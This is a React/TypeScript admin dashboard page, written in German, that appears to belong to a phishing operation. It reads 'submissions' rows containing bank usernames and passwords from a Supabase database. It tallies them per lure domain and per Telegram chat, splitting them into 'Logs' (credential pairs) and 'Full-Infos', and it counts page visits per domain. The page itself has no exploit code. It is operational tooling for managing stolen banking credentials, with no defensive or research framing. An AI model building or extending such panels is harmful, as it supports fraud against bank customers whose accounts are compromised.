import { useMemo } from "react";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import AdminLayout from "@/components/AdminLayout";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { BarChart3, Globe, Send, Users, FileText, KeyRound, Eye } from "lucide-react";

interface SubRow { domain: string | null; bank_username: string | null; bank_password: string | null; }
interface VisitRow { domain: string | null; }
interface ChatRow { id: string; chat_id: string; label: string | null; domains: string[]; }

function StatisticsContent() {
  const { data: submissions = [] } = useQuery({
    queryKey: ["stats-submissions"],
    queryFn: async () => {
      const all: SubRow[] = [];
      let from = 0;
      const PAGE = 1000;
      while (true) {
        const { data, error } = await supabase
          .from("submissions")
          .select("domain,bank_username,bank_password")
          .range(from, from + PAGE - 1);
        if (error) throw error;
        const rows = (data || []) as SubRow[];
        all.push(...rows);
        if (rows.length < PAGE) break;
        from += PAGE;
      }
      return all;
    },
  });

  const { data: chats = [] } = useQuery({
    queryKey: ["stats-telegram-chats"],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("telegram_chat_ids")
        .select("id,chat_id,label,domains")
        .order("created_at", { ascending: true });
      if (error) throw error;
      return (data || []) as ChatRow[];
    },
  });

  const { data: visits = [] } = useQuery({
    queryKey: ["stats-page-visits"],
    queryFn: async () => {
      const all: VisitRow[] = [];
      let from = 0;
      const PAGE = 1000;
      while (true) {
        const { data, error } = await supabase
          .from("page_visits")
          .select("domain")
          .range(from, from + PAGE - 1);
        if (error) throw error;
        const rows = (data || []) as VisitRow[];
        all.push(...rows);
        if (rows.length < PAGE) break;
        from += PAGE;
      }
      return all;
    },
  });

  const isLog = (s: SubRow) => !!(s.bank_username && s.bank_password);

  const totals = useMemo(() => {
    const logs = submissions.filter(isLog).length;
    const domains = new Set(submissions.map((s) => s.domain).filter(Boolean) as string[]);
    return {
      total: submissions.length,
      logs,
      full: submissions.length - logs,
      domains: domains.size,
      chats: chats.length,
    };
  }, [submissions, chats]);

  const domainLabels = useMemo(() => {
    const map = new Map<string, { label: string; chat_id: string }[]>();
    for (const c of chats) {
      if (c.domains.includes("*")) continue;
      for (const d of c.domains) {
        const arr = map.get(d) || [];
        arr.push({ label: c.label || c.chat_id, chat_id: c.chat_id });
        map.set(d, arr);
      }
    }
    return map;
  }, [chats]);

  const visitsByDomain = useMemo(() => {
    const map = new Map<string, number>();
    for (const v of visits) {
      const d = v.domain || "(ohne Domain)";
      map.set(d, (map.get(d) || 0) + 1);
    }
    return map;
  }, [visits]);

  const domainStats = useMemo(() => {
    const map = new Map<string, { domain: string; total: number; logs: number; full: number; visits: number }>();
    for (const s of submissions) {
      const d = s.domain || "(ohne Domain)";
      const entry = map.get(d) || { domain: d, total: 0, logs: 0, full: 0, visits: 0 };
      entry.total++;
      if (isLog(s)) entry.logs++;
      else entry.full++;
      map.set(d, entry);
    }
    // Include domains that have visits but no submissions yet
    for (const [d, count] of visitsByDomain) {
      const entry = map.get(d) || { domain: d, total: 0, logs: 0, full: 0, visits: 0 };
      entry.visits = count;
      map.set(d, entry);
    }
    return Array.from(map.values()).sort((a, b) => b.visits - a.visits || b.total - a.total);
  }, [submissions, visitsByDomain]);


  const chatStats = useMemo(() => {
    return chats.map((c) => {
      const hasWildcard = c.domains.includes("*");
      const matched = hasWildcard
        ? submissions
        : submissions.filter((s) => s.domain && c.domains.includes(s.domain));
      const logs = matched.filter(isLog).length;
      return {
        id: c.id,
        chat_id: c.chat_id,
        label: c.label,
        domains: c.domains,
        wildcard: hasWildcard,
        total: matched.length,
        logs,
        full: matched.length - logs,
      };
    }).sort((a, b) => b.total - a.total);
  }, [chats, submissions]);

  const statCards = [
    { label: "Besuche", value: visits.length, icon: Eye, color: "text-purple-700 bg-purple-50 border-purple-200" },
    { label: "Gesamt", value: totals.total, icon: Users, color: "text-slate-600 bg-slate-50 border-slate-200" },
    { label: "Logs", value: totals.logs, icon: KeyRound, color: "text-emerald-700 bg-emerald-50 border-emerald-200" },
    { label: "Full-Infos", value: totals.full, icon: FileText, color: "text-amber-700 bg-amber-50 border-amber-200" },
    { label: "Domains", value: totals.domains, icon: Globe, color: "text-blue-700 bg-blue-50 border-blue-200" },
    { label: "Telegram Chats", value: totals.chats, icon: Send, color: "text-indigo-700 bg-indigo-50 border-indigo-200" },
  ];

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold text-slate-900 tracking-tight flex items-center gap-2">
          <BarChart3 className="h-6 w-6 text-slate-400" /> Statistiken
        </h1>
        <p className="text-sm text-slate-500 mt-0.5">Übersicht über Einträge, Domains und Telegram-Chats</p>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
        {statCards.map((c) => (
          <div key={c.label} className={`rounded-xl border p-4 ${c.color}`}>
            <div className="flex items-center justify-between">
              <span className="text-xs font-medium uppercase tracking-wider opacity-70">{c.label}</span>
              <c.icon className="h-4 w-4 opacity-60" />
            </div>
            <p className="mt-2 text-2xl font-bold">{c.value}</p>
          </div>
        ))}
      </div>

      {/* Domain Stats */}
      <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-hidden">
        <div className="border-b border-slate-100 px-4 py-3 flex items-center gap-2">
          <Globe className="h-4 w-4 text-slate-400" />
          <h2 className="text-sm font-semibold text-slate-700">Einträge pro Domain</h2>
          <span className="text-xs text-slate-400 ml-auto">{domainStats.length} Domains</span>
        </div>
        <Table>
          <TableHeader>
            <TableRow className="bg-slate-50/80 border-b border-slate-100">
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Domain</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Logs</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Full-Infos</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right pr-4">Gesamt</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {domainStats.map((d) => (
              <TableRow key={d.domain} className="border-b border-slate-100 last:border-0 hover:bg-slate-50/60">
                <TableCell className="pl-4">
                  <div className="flex flex-wrap items-center gap-1.5">
                    <span className="font-mono text-xs text-slate-700">{d.domain}</span>
                    {(domainLabels.get(d.domain) || []).map((l, i) => (
                      <Badge key={i} variant="outline" className="border-blue-200 bg-blue-50 text-blue-700 text-[10px] font-medium">{l.label}</Badge>
                    ))}
                  </div>
                </TableCell>
                <TableCell className="text-right">
                  <Badge variant="outline" className="border-emerald-200 bg-emerald-50 text-emerald-700 text-[10px] font-medium">{d.logs}</Badge>
                </TableCell>
                <TableCell className="text-right">
                  <Badge variant="outline" className="border-amber-200 bg-amber-50 text-amber-700 text-[10px] font-medium">{d.full}</Badge>
                </TableCell>
                <TableCell className="pr-4 text-right font-semibold text-slate-800">{d.total}</TableCell>
              </TableRow>
            ))}
            {domainStats.length === 0 && (
              <TableRow><TableCell colSpan={4} className="text-center text-slate-400 py-12">Keine Einträge</TableCell></TableRow>
            )}
          </TableBody>
        </Table>
      </div>

      {/* Telegram Chat Stats */}
      <div className="rounded-xl border border-slate-200 bg-white shadow-sm overflow-hidden">
        <div className="border-b border-slate-100 px-4 py-3 flex items-center gap-2">
          <Send className="h-4 w-4 text-slate-400" />
          <h2 className="text-sm font-semibold text-slate-700">Einträge pro Telegram-Chat</h2>
          <span className="text-xs text-slate-400 ml-auto">{chatStats.length} Chats</span>
        </div>
        <Table>
          <TableHeader>
            <TableRow className="bg-slate-50/80 border-b border-slate-100">
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider pl-4">Chat</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Domains</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Logs</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right">Full-Infos</TableHead>
              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider text-right pr-4">Gesamt</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {chatStats.map((c) => (
              <TableRow key={c.id} className="border-b border-slate-100 last:border-0 hover:bg-slate-50/60 align-top">
                <TableCell className="pl-4 py-3">
                  <div className="flex flex-col">
                    <span className="font-medium text-sm text-slate-800">{c.label || "—"}</span>
                    <span className="font-mono text-[11px] text-slate-400">{c.chat_id}</span>
                  </div>
                </TableCell>
                <TableCell className="py-3">
                  <div className="flex flex-wrap gap-1 max-w-md">
                    {c.wildcard ? (
                      <Badge variant="outline" className="border-blue-200 bg-blue-50 text-blue-700 text-[10px]">Alle Domains (*)</Badge>
                    ) : c.domains.length === 0 ? (
                      <span className="text-xs text-slate-400">—</span>
                    ) : (
                      c.domains.map((d) => (
                        <Badge key={d} variant="outline" className="border-slate-200 bg-slate-50 text-slate-600 text-[10px] font-mono font-normal">{d}</Badge>
                      ))
                    )}
                  </div>
                </TableCell>
                <TableCell className="text-right py-3">
                  <Badge variant="outline" className="border-emerald-200 bg-emerald-50 text-emerald-700 text-[10px] font-medium">{c.logs}</Badge>
                </TableCell>
                <TableCell className="text-right py-3">
                  <Badge variant="outline" className="border-amber-200 bg-amber-50 text-amber-700 text-[10px] font-medium">{c.full}</Badge>
                </TableCell>
                <TableCell className="pr-4 text-right font-semibold text-slate-800 py-3">{c.total}</TableCell>
              </TableRow>
            ))}
            {chatStats.length === 0 && (
              <TableRow><TableCell colSpan={5} className="text-center text-slate-400 py-12">Keine Telegram-Chats konfiguriert</TableCell></TableRow>
            )}
          </TableBody>
        </Table>
      </div>
    </div>
  );
}

export default function AdminStatistiken() {
  return (
    <AdminLayout>
      <StatisticsContent />
    </AdminLayout>
  );
}
